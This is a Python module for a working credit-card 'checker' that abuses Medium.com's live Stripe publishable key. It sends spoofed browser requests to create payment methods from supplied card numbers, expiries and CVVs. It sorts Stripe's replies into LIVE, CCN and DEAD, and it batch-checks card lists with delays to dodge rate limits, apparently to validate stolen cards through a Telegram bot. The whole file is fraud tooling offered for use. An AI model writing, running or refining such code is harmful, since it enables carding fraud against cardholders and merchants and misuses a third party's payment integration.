"""
Async Medium Stripe Payment Checker
For integration with async Telegram bots (Pyrogram/Telethon)

Usage:
    from medium_async import check_card_async
    result = await check_card_async("4111111111111111", "12", "25", "123")
"""

import httpx
import uuid
import time
import re
import asyncio
from typing import Optional, Tuple, Dict, List


class MediumCheckerAsync:
    """Async Medium.com Stripe Payment Checker"""
    
    def __init__(self):
        self.pk_key = "pk_live_7FReX44VnNIInZwrIIx6ghjl"
        self.stripe_version = "2025-03-31.basil"
        self.timeout = 30.0
        self._client: Optional[httpx.AsyncClient] = None
    
    def _get_headers(self) -> dict:
        """Get default headers"""
        return {
            'accept': 'application/json',
            'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'content-type': 'application/x-www-form-urlencoded',
        }
    
    async def _get_client(self) -> httpx.AsyncClient:
        """Get or create async HTTP client"""
        if self._client is None or self._client.is_closed:
            self._client = httpx.AsyncClient(
                headers=self._get_headers(),
                timeout=self.timeout
            )
        return self._client
    
    async def close(self):
        """Close the HTTP client"""
        if self._client and not self._client.is_closed:
            await self._client.aclose()
    
    def _generate_ids(self) -> Tuple[str, str, str, str]:
        """Generate required UUID identifiers"""
        guid = str(uuid.uuid4()).replace('-', '')[:32] + str(uuid.uuid4())[:6]
        muid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
        sid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
        client_session_id = str(uuid.uuid4())
        return guid, muid, sid, client_session_id
    
    async def create_payment_method(self, cc: str, mes: str, ano: str, cvv: str) -> dict:
        """
        Create a Stripe payment method with card details
        
        Args:
            cc: Card number
            mes: Expiry month (MM)
            ano: Expiry year (YY or YYYY)
            cvv: CVV/CVC code
            
        Returns:
            dict: Payment method response or error
        """
        client = await self._get_client()
        guid, muid, sid, client_session_id = self._generate_ids()
        
        # Format year if full year provided
        if len(str(ano)) == 4:
            ano = str(ano)[2:]
        
        # Ensure month is 2 digits
        mes = str(mes).zfill(2)
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
            'referrer': 'https://medium.com',
            'time_on_page': str(int(time.time() * 1000) % 100000),
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'key': self.pk_key,
            '_stripe_version': self.stripe_version,
        }
        
        try:
            response = await client.post(
                'https://api.stripe.com/v1/payment_methods',
                data=data
            )
            return response.json()
        except httpx.RequestError as e:
            return {'error': {'message': f'Request failed: {str(e)}'}}
        except Exception as e:
            return {'error': {'message': f'Error: {str(e)}'}}
    
    async def confirm_payment_intent(
        self, 
        payment_method_id: str, 
        client_secret: str, 
        payment_intent_id: str
    ) -> dict:
        """
        Confirm a payment intent with the payment method
        
        Args:
            payment_method_id: The PM ID from create_payment_method
            client_secret: The client secret for the payment intent
            payment_intent_id: The payment intent ID
            
        Returns:
            dict: Confirmation response
        """
        client = await self._get_client()
        _, _, _, client_session_id = self._generate_ids()
        
        data = {
            'return_url': 'https://medium.com/welcome-member',
            'payment_method': payment_method_id,
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'key': self.pk_key,
            '_stripe_version': self.stripe_version,
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'l1',
            'client_secret': client_secret,
        }
        
        try:
            response = await client.post(
                f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',
                data=data
            )
            return response.json()
        except httpx.RequestError as e:
            return {'error': {'message': f'Request failed: {str(e)}'}}
        except Exception as e:
            return {'error': {'message': f'Error: {str(e)}'}}
    
    async def check(self, cc: str, mes: str, ano: str, cvv: str) -> dict:
        """
        Full card check flow (async)
        
        Args:
            cc: Card number
            mes: Expiry month
            ano: Expiry year
            cvv: CVV code
            
        Returns:
            dict: Result with status and message
        """
        result = {
            'card': f'{cc}|{mes}|{ano}|{cvv}',
            'status': 'Unknown',
            'response': '',
            'pm_id': None,
        }
        
        # Step 1: Create Payment Method
        pm_response = await self.create_payment_method(cc, mes, ano, cvv)
        
        if 'error' in pm_response:
            error = pm_response['error']
            error_code = error.get('code', '')
            error_message = error.get('message', 'Unknown error')
            decline_code = error.get('decline_code', '')
            
            result['response'] = error_message
            result['error_code'] = error_code
            result['decline_code'] = decline_code
            
            # Classify the response
            if any(x in error_code.lower() for x in ['incorrect_cvc', 'invalid_cvc']):
                result['status'] = 'CCN'
                result['response'] = 'Invalid/Incorrect CVC'
            elif 'insufficient_funds' in str(decline_code).lower():
                result['status'] = 'LIVE'
                result['response'] = 'Insufficient Funds [LIVE]'
            elif 'card_declined' in error_code.lower():
                if decline_code:
                    result['response'] = f'Declined: {decline_code}'
                result['status'] = 'DEAD'
            elif 'expired_card' in error_code.lower():
                result['status'] = 'DEAD'
                result['response'] = 'Card Expired'
            elif 'incorrect_number' in error_code.lower():
                result['status'] = 'DEAD'
                result['response'] = 'Incorrect Card Number'
            elif 'invalid_expiry' in error_code.lower():
                result['status'] = 'DEAD'
                result['response'] = 'Invalid Expiry Date'
            elif 'processing_error' in error_code.lower():
                result['status'] = 'RETRY'
                result['response'] = 'Processing Error - Retry'
            elif 'rate_limit' in error_code.lower():
                result['status'] = 'RATE_LIMITED'
                result['response'] = 'Rate Limited - Try Again Later'
            else:
                result['status'] = 'DEAD'
                
            return result
        
        # Payment method created successfully
        pm_id = pm_response.get('id')
        card_info = pm_response.get('card', {})
        
        result['pm_id'] = pm_id
        result['brand'] = card_info.get('brand', 'Unknown')
        result['last4'] = card_info.get('last4', cc[-4:])
        result['funding'] = card_info.get('funding', 'Unknown')
        result['country'] = card_info.get('country', 'Unknown')
        
        # Check for CVC result
        checks = card_info.get('checks', {})
        cvc_check = checks.get('cvc_check', '')
        
        if cvc_check == 'pass':
            result['status'] = 'LIVE'
            result['response'] = 'Payment Method Created - CVC Pass'
        elif cvc_check == 'fail':
            result['status'] = 'CCN'
            result['response'] = 'CVC Check Failed'
        elif cvc_check == 'unchecked':
            result['status'] = 'LIVE'
            result['response'] = 'Payment Method Created - Unchecked'
        else:
            result['status'] = 'LIVE'
            result['response'] = f'Payment Method Created [{pm_id}]'
        
        return result


# Global checker instance for reuse
_checker_instance: Optional[MediumCheckerAsync] = None


async def get_checker() -> MediumCheckerAsync:
    """Get or create global checker instance"""
    global _checker_instance
    if _checker_instance is None:
        _checker_instance = MediumCheckerAsync()
    return _checker_instance


async def check_card_async(cc: str, mes: str, ano: str, cvv: str) -> dict:
    """
    Quick async function to check a single card
    
    Args:
        cc: Card number
        mes: Expiry month
        ano: Expiry year
        cvv: CVV code
        
    Returns:
        dict: Check result
    """
    checker = await get_checker()
    return await checker.check(cc, mes, ano, cvv)


def parse_card(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card string in various formats
    
    Supports:
        - 4111111111111111|12|25|123
        - 4111111111111111/12/25/123
        - 4111111111111111 12 25 123
        
    Returns:
        tuple: (cc, mes, ano, cvv) or None
    """
    patterns = [
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',  # pipe delimiter
        r'(\d{13,19})/(\d{1,2})/(\d{2,4})/(\d{3,4})',      # slash delimiter
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})', # space delimiter
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            return match.groups()
    return None


async def check_multiple_async(cards_list: List[str], delay: float = 1.0) -> dict:
    """
    Check multiple cards asynchronously
    
    Args:
        cards_list: List of card strings
        delay: Delay between checks (rate limiting)
        
    Returns:
        dict: Results categorized by status
    """
    results = {
        'live': [],
        'ccn': [],
        'dead': [],
        'retry': [],
        'unknown': []
    }
    
    checker = await get_checker()
    
    for card_string in cards_list:
        parsed = parse_card(card_string)
        if not parsed:
            print(f"Invalid format: {card_string}")
            continue
        
        cc, mes, ano, cvv = parsed
        result = await checker.check(cc, mes, ano, cvv)
        
        status_lower = result['status'].lower()
        if status_lower == 'live':
            results['live'].append(result)
        elif status_lower == 'ccn':
            results['ccn'].append(result)
        elif status_lower == 'dead':
            results['dead'].append(result)
        elif status_lower in ['retry', 'rate_limited']:
            results['retry'].append(result)
        else:
            results['unknown'].append(result)
        
        await asyncio.sleep(delay)
    
    return results


# Example usage in async context
async def main():
    """Example usage"""
    print("Testing Medium Stripe Checker (Async)")
    
    # Test with a sample card format
    test_card = "4111111111111111|12|25|123"
    parsed = parse_card(test_card)
    
    if parsed:
        cc, mes, ano, cvv = parsed
        result = await check_card_async(cc, mes, ano, cvv)
        print(f"Card: {result['card']}")
        print(f"Status: {result['status']}")
        print(f"Response: {result['response']}")
    
    # Cleanup
    checker = await get_checker()
    await checker.close()


if __name__ == "__main__":
    asyncio.run(main())
